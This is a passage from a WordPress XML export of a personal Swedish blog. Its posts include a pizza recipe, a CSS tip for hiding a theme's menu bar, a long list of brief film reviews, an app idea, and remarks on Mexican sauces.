		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[58]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[58]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Pizzarecept</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/04/08/pizzarecept/</link>
		<pubDate>Wed, 08 Apr 2015 17:03:18 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=67</guid>
		<description></description>
		<content:encoded><![CDATA[
<h3>Ingredienser</h3>
<ul>
	<li>4 dl vetemjöl</li>
	<li>1 tsk salt</li>
	<li>2 tsk bakpulver</li>
	<li>1 ½ dl vatten
	<li>½ dl olivolja</li>
</ul>

<h3>Tillagning</h3>
<ol>
<li>Bland mjöl, salt och bakpulver i en bunke. </li>
<li> Blanda i olivolja och ljummet vatten.</li>
<li> Rör om å knåda ihop till en deg. Du kan behöva lägga i extra mjöl. </li>
<li> Låt jäsa en stund, mellan 15-90 min. </li>
<li> Kavla ut å lägg på låt som du antingen smetar ut olja på eller lite mjöl. </li>
<li> In i ugnen på 250 grader tills pizzan e klar. </li>

</ol>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>67</wp:post_id>
		<wp:post_date>2015-04-08 17:03:18</wp:post_date>
		<wp:post_date_gmt>2015-04-08 17:03:18</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>pizzarecept</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="how-to"><![CDATA[how-to]]></category>
		<category domain="post_tag" nicename="matlagning"><![CDATA[matlagning]]></category>
		<category domain="post_tag" nicename="pizza"><![CDATA[pizza]]></category>
		<category domain="category" nicename="recept"><![CDATA[recept]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[67]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[67]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Artikelidé - Vad togs aidset vägen?</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/04/08/artikelide-vad-togs-aidset-vagen/</link>
		<pubDate>Wed, 08 Apr 2015 15:53:36 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=68</guid>
		<description></description>
		<content:encoded><![CDATA[Varför rapporteras det inte längre om HIV/AIDS? Är det en modegrej eller är det faktiskt inte lika spritt som förut. BLir det bättre, eller var det klimatförändringarna och andra katastrofer som tog över strålkastarljuset?]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>68</wp:post_id>
		<wp:post_date>2015-04-08 15:53:36</wp:post_date>
		<wp:post_date_gmt>2015-04-08 15:53:36</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>artikelide-vad-togs-aidset-vagen</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="aids"><![CDATA[aids]]></category>
		<category domain="post_tag" nicename="artikel"><![CDATA[artikel]]></category>
		<category domain="category" nicename="artikelide"><![CDATA[artikelidé]]></category>
		<category domain="post_tag" nicename="hiv"><![CDATA[hiv]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[68]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[68]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Radera övre meny-raden</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/04/08/radera-ovre-meny-raden/</link>
		<pubDate>Wed, 08 Apr 2015 19:51:59 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=71</guid>
		<description></description>
		<content:encoded><![CDATA[Hur gör man för att ta bort den övre menyraden i temat Fashionistas?

Ett sätt är att gå in i header.php och kommentera ut följande del:
<pre>&lt;nav id="top-navigation" class="main-navigation"&gt;
<div class="clearfix container"></div></pre>
Kommentering görs genom att skriva
<pre>&lt;!--- htmlhtmlhtml ---&gt;&lt;!--- htmlhtmlhtml --&gt;</pre>
Sätt nr två, och som antagligen är mycket smidigare är att lägga in css-koden:
<pre>#top-navigation ul {
display: none;
}</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>71</wp:post_id>
		<wp:post_date>2015-04-08 19:51:59</wp:post_date>
		<wp:post_date_gmt>2015-04-08 19:51:59</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>radera-ovre-meny-raden</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="how-to"><![CDATA[how-to]]></category>
		<category domain="post_tag" nicename="meny-rad"><![CDATA[meny-rad]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[wordpress]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[71]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[71]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Filmer jag sett nyligen</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/04/11/filmer-jag-sett-nyligen/</link>
		<pubDate>Sat, 11 Apr 2015 17:22:50 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=78</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>Nightcrawler</strong> - man - fantastisk. om den ekonomiska mannen. homo economicus.
<strong>Love and other drugs</strong> - man - rätt kass romkom.
<strong>Love, Rosie</strong> - man - rätt kass romkom.
<strong>Hooligans</strong> - man - om våld. helt okej.
<strong>Spectre</strong>  - man - precis så infantil löjlig och dålig som bond alltid är.
<strong>The Big Short</strong>  - man - galet bra.
<strong>The Diary of a Teenage girl</strong>  - kvinna - riktigt bra. <strong>Irrational man</strong>  - man - Fan precis sett Woody Allens senaste. Dom är ju enkla å underhållande. Men alltså dialogen är ju verkligen under all kritik. Namedroppping av filosofer känns bara pinsam..
<strong>Inside out</strong>  - man - riktigt fin å underhållande.
<strong>The Pirate of Silicon Valley</strong>  - man - semiunderhållande.
<strong>Carol</strong> - man - sisådär.
<strong>The Zero Theorem</strong> - man - galet dålig.
<strong>Night falls</strong> - Kvinna - Riktigt bra. SNygg å spännande
<strong>Train-wreck</strong> - man - riktigt underhållande.
<strong>Top five</strong> - Man - Hyffsat underhållande
<strong>Dear White People </strong> man - riktigt bra.
<strong>Thirteen floor</strong> - Man - Lite som Matrix. Dålig.
<strong>Freedom Downtime</strong> - Man - Galet dålig. Som en youtube dokumentär gjord av en rättshaverist. 
<strong>23</strong> - Man - Som så ofta. Puckade karaktärer. I övrigt underhållande.
<strong>Sneakers</strong> - Man - Rätt kass.
<strong>She's funny that way</strong> - Man - Galet dålig
<strong>Who Am I - No system is safe</strong> - Man - Underhållande
<strong>Open window</strong> - Man - Riktigt dålig.
<strong>Stockholm</strong> - Man - Riktigt bra.
<strong>Tron</strong> - Man - Galet bra.
<strong>We live in public</strong> - Kvinna - Riktigt kass.
<strong>Deep web</strong> - Man - Riktigt kass. Handlade bara om Silk Road å inget om deep web.
<strong>How steve jobs changed the world</strong> - Man - Fick mig att hata mac mer än någonsin. Riktigt dålig.
<strong>Black mirror - white christmas</strong> - Man - Otrolig. Det läskigaste jag någonsin sett på tv.
<strong>Shes funny that way</strong> - Man - Fruktansvärd. Spolade igen. Korkad fars.
<strong>Infinitely polar bear</strong> - Kvinna - Feelgood. Mysig.
<strong>Parallells</strong> - Man - Idiotiska karaktärer. men lite spännande ändå.
<strong>Jalla jalla</strong> - Man - Ja, ingen höjdare direkt. Men lite mysig.
<strong>The Act of Killing</strong> - Man - Galet bra. Bästa dokumentären som någonsin gjorts.
<strong>UFO</strong> - Man - Okej underhållande. Lite intressant.
<strong>Enemy</strong> - Man - Riktigt riktigt dålig. Två personer som är lika varandra, slut.
<strong>People places things</strong> - Man - Mysig. Inte mycket mer.
<strong>Dope</strong> - Man - Episkt bra.
<strong>Allende mi abuelo allende </strong> - kvinna - som att gå på abba-museet samtidigt som man tvingas gå igenom timmar av nån jobbig farbrors semesterbilder. Så plågsamt.
<strong>Watchmen</strong> - Man - Så värdelös att man fan storknar. Utmärkande ofattbart dålig.
<strong>Wildlife</strong> - Man - Fina färger, fina miljöer. Långsam. Bra. Drama.
<strong>What if</strong> - Man - Gullig. Young professionals vars hela liv är en räkmacka. Sen betvivlar de sina val och har snabba, rappa moderna konversationer.
<strong>Under the tuscan sun</strong> - kvinna - Ja, helt episkt dålig. I stil med Eat Pray Love. Så genomusel att man bara skrattar.
<strong>Blue is the warmest color</strong> - Man - 2015-10-04 Bästa filmen jag sett på länge. Alla skådisar är otroliga, speciellt huvudrollen. Ingen är ond eller god. Ingen har rätt eller fel. Allt är bara mänskligt.
<strong>The Fighter</strong> - Man - En film om män som slåss, lite underklass, lite droger, lite träning, lite comeback. Underhållande, men egentligen är det såklart helt värdelös. Christian Bale är såklart en bra skådis.
<strong>Thale</strong> - Mystisk, spännande, fina bilder.
<strong>I give it a year</strong> - Man - Helt fruktansvärt värdelös.
<strong>Joe Hill</strong> Man - Bra. Hemsk. Ångestgivande.
<strong>Smoke</strong> - Man - Väldigt Paul Auster. Möten mellan människor från olika klasser som skapar en slags vänskap.
<strong>Seeking a Friend for the End of the World</strong> - Kvinna - Rätt kass.
<strong>Igby goes down</strong> - Man tror jag. Jättedålig.
<strong>Heartbeats</strong> - Man - långsam. slowmotion. fina bilder. underhållande.
<strong>Begin again</strong> - Man - musik/romkom/drama/newyork/sommar. en av de bästa romkomsen jag sett på länge. sevärt.
<strong>Rosewater</strong> - Man - Mja.
<strong>Como agua para chocolate </strong> - jättedålig.
<strong>God Bless America </strong> - Man - Rätt kass. Händer inget direkt.

<strong>The English Teacher </strong> - Man - Urusel. Dåliga värderingar, kass på alla sätt å vis.

<strong>Maps to the Starts</strong> - Man - Helt sjuk. Galna dialoger. Obehaglig. Riktigt bra.

<strong>Ginger and Rosa </strong> - Kvinna - Långsam, sorglig, djup, snygg. Riktigt bra.

<strong>The Internship</strong> - Man - Episkt dålig reklamfilm för google.

<strong>Appropriate Behaviour</strong> - Kvinna - Den e mysigt. Som en lite vemodig romkom. Brooklyn/queer/iranier/quirky/sex. Så skulle jag tagga den filmen.

<strong>Selma</strong> - Kvinna - Rörande. Mäktig. Långsam. Långa scener, långa konversationer. Jättebra.

<strong>Samba</strong> - Man - Riktigt riktigt bra. Jag grät inte. Samba va lite irriterande ibland tycker jag, när han skämtade med brassen å bara var störig ibland. Å Charlotte-karaktären va bra, jag gillade inte att hon snodde Sambas foto. Men på plussidan är såklart att det är en fin romkom i en annorlunda setting. Det är precis såhär filmer ska vara. Jag odiggar när lidandet blir typ huvudrollen i filmen, så att det blir mer en övertygelseresa/propaganda för en viss åsikt. Det bästa är ju när en historia berättas i ett sammahang som är viktigt att beskriva.
Det hade såklart varit ännu bättre om kärlekshistorian hade varit mellan två migranter, för att undvika den klassiska vit-rik med svart-fattig. Men det är ju en generell kritik, mot hela romkom-genren, att nästan inga romantiska komedier har arbetarklass som setting. Det är ju alltid medel/överklass eller kärlek över klassgränserna.

<strong>Leviathan</strong> - Hemsk. Galet snygg. Bra.

<strong>Coffy</strong> - Bra, hämndvåldsfilm.

<strong>Terminal Island</strong> - Underhållande.

<strong>Particle Fever</strong> - Asbra. 2015-07-26

<strong>Mamma mia</strong> - Inledningsvis dålig, blir lite skönt lättsam mot slutet.

<strong>Ultramarathon man</strong> - Om Dan Karnezes. Fruktansvärd. Otroligt dålig.

<strong>Millenium-triologin</strong> - underhållande.

<strong>Waking life</strong> - riktigt bra.

<strong>Force majure</strong> - Asbra.

<strong>Focus</strong> - Con-man film. Man har sett den förut.

<strong>Looper</strong> - Tidsresefilm. Väldigt tröttsam.

<strong>Dom över död man - Jan Troell</strong> - Seg.

<strong>Moon</strong> - Okej underhållande. Men ändå lite långtråkig.

<strong>Jacobs Ladder</strong> - Obehaglig. Melankolisk stämning. Ett hemskt new york på åttiotalet.

<strong>Summer of Sam - Spike Lee</strong> - Inte mycket mer än okej.

<strong>Predestination</strong> - Mycket underhållande.

<strong>Terminator - James Cameron</strong> - Lite mycket action. Men cool story.

<strong>In Good Company</strong> - Riktigt risig.

<strong>Do the right thing</strong> - Spike Lee. hemsk. bra.

<strong>Eyes Wide Shut</strong>

<strong>Kingsman</strong> - i de första scenerna tänkte jag att det skulle vara en skitfilm. sen bara växte den. den tar sig inte på så stort allvar, kul med den mest pretentiösa skådisen någonsin (Samuel L Jackson) i en skojig roll. kul med övervåld också.

<strong>Wild</strong> - fina naturbilder. helt okej.

<strong>Crazy stupid love</strong> - visst att man ser dåliga romantiska komedier ibland, men det här är uruselt vidrigt. jag önskade att det skulle gå åt helvete för alla. alla karaktärer var osympatiska.

<strong>Chappie</strong> - kul med die antwoord. kul med AI, men korkad film å korkade å irriterande karaktärer.

<strong>Ex Machina</strong> - Jättebra. AI-robotar är onda.

<strong>Jupiter Ascending</strong> - tim-burtons estetik på nått sätt. rätt så löjlig på det stora hela. mycket damsel in distress.

<strong>Le Charme discret de la bourgeoisie</strong> - Luis Bunuel. En överlag intressant film. Bästa scenen är i en av borgarnas drömmar där sällskapet ska äta middag, som de försöker göra genom hela filmen, emn upptäcker att de befinner sig bakom ridån på en teater. De själva är pjäsen. Det är en fantastiskt scen.

<strong>El Àngel Exterminador</strong> - Luis Bunuel - den bästa filmen jag sett på jättelänge. helt fantastisk. alla måste se.

<strong>Listen up Philip</strong> - Vad får man om man blandar wes anderson med woody allen och tar bort all humor och värme? amerikanska universitet, tweedkavajer, författare, stora hus med böcker på väggarna. den är inte jättebra. men en del fina bilder. blanding mellan wes anderson och woody allen, utan humor. kanske inte så jättelockande iof. den påminner mig om författarna Philip Roth och William Faulkner. jag har inte läst endera men Faulker är för mig den mest amerikanskt-universitet-och-upstate-new-york-författaren.

<strong>Hector and the search for happiness</strong> - hands down sämsta filmen jag sett sedan jag såg Siete Años de Matrimonio, som antagligen är den sämsta filmen jag någonsin sett.
Den andalusiska hunden - Luis Bunuel - äcklig scen med ögat. otippat bra. id vs. ego.
Un cuento chino - riktigt dålig. temat: tragisk man hittar tillbaka till livet.

<strong>Mannen på taket</strong> - Poliskritisk, det trodde jag inte. bra.

<strong>The Hunger Games</strong> - The Mockingjay Part 1 - sådär. hände inte så mycket.

<strong>Kvarteret korpen</strong> - Bo Widerberg - bra. sorglig.
<strong>Hunger games - Catching fire</strong> - transportsträcka.
<strong>Upstream color</strong> - konstig. filtrig. dimmig. bra.
<strong>Edge of tomorrow</strong> - underhållande. tidsmaskin.
<strong>The Hunger Games</strong> - underhållande.
<strong>Gravity</strong> - bra. spännande.
<strong>The one I Love</strong> - mystiskt. underhållande.
<strong>Primer</strong> - grym film. riktigt cool.
<strong>About time</strong> - medelklassborglighetens våta dröm. underhållande.
<strong>Dawn of the Planet of the Apes</strong> - genusifiering av apor, irriterande. varför gick inte dom goda aporna samman med de goda människorna och började bygga ett fantastiskt människo-ap-samhälle?

<strong>Ruby Sparks</strong> - skön romkom.

<strong>Children of Men</strong> - cool title. cool backdrop. snygg. men transportmässig historia.

<strong>Gone girl</strong> - spännande.

<strong>Going Clear</strong> - jättebra doku om Scientologin.

<strong>Under the skin</strong> - långtråkig. två snygga scener. den sista och alla vätskescener.

<strong>The Signal</strong> - mystisk. bra.

<strong>Prometheus</strong> - snygg, men hade varit roligare om de kunde prata lite med The Engineers.

<strong>Weird Science</strong> - urusel ungdomsscifikomedi.

<strong>The Fifth Element</strong> - värdelös. urusel. ful å dålig. Bruce Willis är sämst.

<strong>Robot and Frank</strong> - underhållande.

<strong>Air Doll</strong> - tom japansk rulle.

<strong>Electric Dreams</strong> - den har sina stunder. bra grafik.

<strong>The Machine</strong> - bra.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>78</wp:post_id>
		<wp:post_date>2015-04-11 17:22:50</wp:post_date>
		<wp:post_date_gmt>2015-04-11 17:22:50</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>filmer-jag-sett-nyligen</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="film"><![CDATA[film]]></category>
		<category domain="post_tag" nicename="film"><![CDATA[film]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[11296207090]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[78]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[78]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>App-idé: Alla filmer jag någonsin sett</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/04/11/app-ide-alla-filmer-jag-nagonsin-sett/</link>
		<pubDate>Sat, 11 Apr 2015 17:24:49 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=80</guid>
		<description></description>
		<content:encoded><![CDATA[En app enbart för mig, som bygger på IMDB:s API. Gjord för att enkelt lista alla filmer jag sett i mitt liv. Visst redan såna tjänster, men jag vill ha en tjänst som kan printa ut alla den datan i excel i PDF å annan form för att visa statistik och manipulera data.

Antar att man bör kunna göra något liknande med böcker.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>80</wp:post_id>
		<wp:post_date>2015-04-11 17:24:49</wp:post_date>
		<wp:post_date_gmt>2015-04-11 17:24:49</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>app-ide-alla-filmer-jag-nagonsin-sett</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="appide"><![CDATA[appidé]]></category>
		<category domain="post_tag" nicename="appide"><![CDATA[appidé]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[80]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[80]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>om</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/about-2/</link>
		<pubDate>Tue, 30 Nov 2010 18:54:41 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">http://narcotize.wordpress.com/?page_id=2</guid>
		<description></description>
		<content:encoded><![CDATA[Min blogg där jag försöker skriva ner saker innan jag glömmer dom.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1632</wp:post_id>
		<wp:post_date>2010-11-30 18:54:41</wp:post_date>
		<wp:post_date_gmt>2010-11-30 18:54:41</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>about-2</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>page</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_page_template</wp:meta_key>
			<wp:meta_value><![CDATA[default]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>geo_public</wp:meta_key>
			<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Såser i Mexiko</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/04/13/saser-i-mexiko/</link>
		<pubDate>Mon, 13 Apr 2015 01:31:10 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=84</guid>
		<description></description>
		<content:encoded><![CDATA[Alla såser som ska vara mexikanska såser som säljs utanför Mexiko har ingen mexikansk smak alls. Mexikansk rödsås från icke-mexiko smakar ungefär som en italiensk sås fast med lite chili i. Problemet med icke-mexikansk mexikansk sås är att det alltid är för mycket tomat i. I Mexiko innehåller de röda och gröna såserna väldigt lite tomat. Och den gröna såsen innehåller gröna tomater, en sås som knappt existerar utanför Mexiko. Det är tråkigt att det inte finns mexikanska såser som smakar som mexikanska såser, för dom har sin charm.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>84</wp:post_id>
		<wp:post_date>2015-04-13 01:31:10</wp:post_date>
		<wp:post_date_gmt>2015-04-13 01:31:10</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>saser-i-mexiko</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="matlagning"><![CDATA[matlagning]]></category>
		<category domain="post_tag" nicename="matlagning"><![CDATA[matlagning]]></category>
		<category domain="category" nicename="recept"><![CDATA[recept]]></category>
		<category domain="post_tag" nicename="recept"><![CDATA[recept]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[84]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[84]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Vi/vim-kommandon</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/04/14/vivim-kommandon/</link>
